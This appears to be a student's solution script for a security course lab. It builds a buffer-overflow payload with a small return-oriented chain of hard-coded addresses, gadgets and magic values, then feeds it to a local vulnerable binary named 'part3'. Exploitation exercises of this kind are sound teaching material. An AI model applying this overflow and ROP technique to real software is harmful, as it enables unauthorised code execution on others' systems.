import os
import struct
import ctypes
from subprocess import Popen, PIPE, STDOUT
# Please refer to the standard library documentation for more details.

# This code serves as typical template that you might find useful.
# Please feel free to modify in whatever way you deem necessary.

# TIPS: The struct module might prove very useful when dealing with
# byte manipulation.

payload = struct.pack(
    '108s4sIIIIIIII',
    'a' * 108,
    'BBBB',
    0x080488d0,     # food
    0x08048930,     # pop ret
    0xdeadbeef,     # magic
    0x08048932,     # feeling sick
    0x0804892f,     # pop pop ret
    0x0d15ea5e,     # magic 1
    0x0badf00d,     # magic 2
    0x080488a5,     # lazy
)

# The following launches the vulnerable program.
p = Popen(['./part3'], stdout=PIPE, stdin=PIPE, stderr=PIPE)
p.stdin.write(payload)
# Here you can input data into the program.
stdout_data = p.communicate(input='{}'.format(payload))[0]

# Here we are just printing out the contents of STDOUT.
print(stdout_data)
